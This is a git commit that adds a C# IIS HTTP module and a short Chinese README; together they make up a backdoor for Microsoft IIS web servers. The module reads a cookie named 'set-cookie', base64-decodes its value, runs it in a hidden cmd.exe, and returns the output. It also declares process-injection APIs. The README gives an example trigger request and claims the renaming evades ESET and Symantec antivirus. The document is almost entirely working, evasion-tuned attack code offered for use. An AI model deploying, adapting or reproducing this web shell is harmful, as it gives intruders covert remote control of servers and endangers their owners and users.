2cb92e2c6d5ec13dd7089c0ea98aae9417fdc17b
BackDoor <72059221+badboycxcc@users.noreply.github.com>
2023-02-23 11:49:03 +0800

    Add files via upload

---
+++ IIS_Server_dll/IISModule.cs
@@ -0,0 +1,197 @@
+﻿using System;
+using System.Collections;
+using System.Collections.ObjectModel;
+using System.Diagnostics;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Web;
+using static IIS_Server_dll.Program;
+
+namespace IIS_Server_dll
+{
+    public static class Program
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public class SecurityAttributes
+        {
+            public Int32 Length = 0;
+            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
+            public bool bInheritHandle = false;
+
+            public SecurityAttributes()
+            {
+                this.Length = Marshal.SizeOf(this);
+            }
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct ProcessInformation
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public Int32 dwProcessId;
+            public Int32 dwThreadId;
+        }
+        [Flags]
+        public enum CreateProcessFlags : uint
+        {
+            DEBUG_PROCESS = 0x00000001,
+            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+            CREATE_SUSPENDED = 0x00000004,
+            DETACHED_PROCESS = 0x00000008,
+            CREATE_NEW_CONSOLE = 0x00000010,
+            NORMAL_PRIORITY_CLASS = 0x00000020,
+            IDLE_PRIORITY_CLASS = 0x00000040,
+            HIGH_PRIORITY_CLASS = 0x00000080,
+            REALTIME_PRIORITY_CLASS = 0x00000100,
+            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+            CREATE_SEPARATE_WOW_VDM = 0x00000800,
+            CREATE_SHARED_WOW_VDM = 0x00001000,
+            CREATE_FORCEDOS = 0x00002000,
+            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+            INHERIT_PARENT_AFFINITY = 0x00010000,
+            INHERIT_CALLER_PRIORITY = 0x00020000,
+            CREATE_PROTECTED_PROCESS = 0x00040000,
+            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+            PROCESS_MODE_BACKGROUND_END = 0x00200000,
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+            CREATE_NO_WINDOW = 0x08000000,
+            PROFILE_USER = 0x10000000,
+            PROFILE_KERNEL = 0x20000000,
+            PROFILE_SERVER = 0x40000000,
+            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
+        }
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        public class StartupInfo
+        {
+            public Int32 cb = 0;
+            public IntPtr lpReserved = IntPtr.Zero;
+            public IntPtr lpDesktop = IntPtr.Zero;
+            public IntPtr lpTitle = IntPtr.Zero;
+            public Int32 dwX = 0;
+            public Int32 dwY = 0;
+            public Int32 dwXSize = 0;
+            public Int32 dwYSize = 0;
+            public Int32 dwXCountChars = 0;
+            public Int32 dwYCountChars = 0;
+            public Int32 dwFillAttribute = 0;
+            public Int32 dwFlags = 0;
+            public Int16 wShowWindow = 0;
+            public Int16 cbReserved2 = 0;
+            public IntPtr lpReserved2 = IntPtr.Zero;
+            public IntPtr hStdInput = IntPtr.Zero;
+            public IntPtr hStdOutput = IntPtr.Zero;
+            public IntPtr hStdError = IntPtr.Zero;
+            public StartupInfo()
+            {
+                this.cb = Marshal.SizeOf(this);
+            }
+        }
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
+                IntPtr lpEnvironment,
+                String lpCurrentDirectory,
+                [In] StartupInfo lpStartupInfo,
+                out ProcessInformation lpProcessInformation
+
+            );
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+
+        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        public static UInt32 MEM_COMMIT = 0x1000;
+    }
+    public class IISModule : IHttpModule
+
+    {
+
+        public void Init(HttpApplication context)
+        {
+            context.BeginRequest += new EventHandler(context_BeginRequest);
+            
+        }
+
+        /// <summary>
+        /// 执行cmd命令
+        /// </summary>
+        /// <param name="cmd"></param>
+        /// <returns></returns>
+        public string SetCmd(string cmd)
+        {
+            cmd = Encoding.UTF8.GetString(Convert.FromBase64String(cmd));
+            Process proc = new Process();
+            proc.StartInfo.CreateNoWindow = true;
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardError = true;
+            proc.StartInfo.RedirectStandardInput = true;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+            proc.StandardInput.WriteLine(cmd);
+            proc.StandardInput.WriteLine("exit");
+            string outStr = proc.StandardOutput.ReadToEnd();
+            proc.Close();
+            return outStr;
+        }
+        
+
+        void context_BeginRequest(object sender, EventArgs e)
+        {
+            HttpApplication application = (HttpApplication)sender;
+            HttpContext context = application.Context;
+            HttpRequest Request = application.Request;
+
+            context_filter(context, Request);
+        }
+        string is_x86()
+        {
+            if (IntPtr.Size == 4)
+            {
+                return "x86";
+            }
+            else
+            {
+                return "x64";
+            }
+        }
+        void context_filter(HttpContext context, HttpRequest Request)
+        {
+            HttpCookieCollection MyCookieColl;
+            HttpCookie MyCookie;
+            MyCookieColl = Request.Cookies;
+            String[] arr1 = MyCookieColl.AllKeys;
+
+            if (arr1.Length > 0)
+            {
+                MyCookie = MyCookieColl[arr1[0]];
+                if (MyCookie.Name.Equals("set-cookie"))
+                {
+                    String cookie = MyCookie.Value;
+                    context.Response.Clear();
+                    context.Response.Write(SetCmd(cookie));
+                    context.Response.End();
+                    context.Response.Close();
+                }     
+            }
+        }
+        public void Dispose()
+        {
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,23 @@
+在原作基础上删除powershell和shellcode功能，只保留cmd功能
+
+
+Cookie: cmd= 改成 Cookie: set-cookie=，对函数名进行混淆
+
+目前已绕过 eset 和 symantec 
+
+```
+GET /aspnet_client/system_web/iisstart.png HTTP/2
+Host: 192.168.42.128
+Cookie: set-cookie=bmV0IHVzZXI=
+```
+
+
+主要是实现了3个功能执行cmd命令，C#调用powershell，执行shellcode
+
+其实文件上传也写了就是IIS_backdoor_shell项目没有添加对应的选项
+
+因为Cookie大小限制是4096所以不能传输很大的文件，你也可以自行修改项目不使用Cookie传输数据
+
+其实还有很多可以改进的地方不过我懒的写了暂时就这样吧
+
+代码写的比较渣大佬误喷
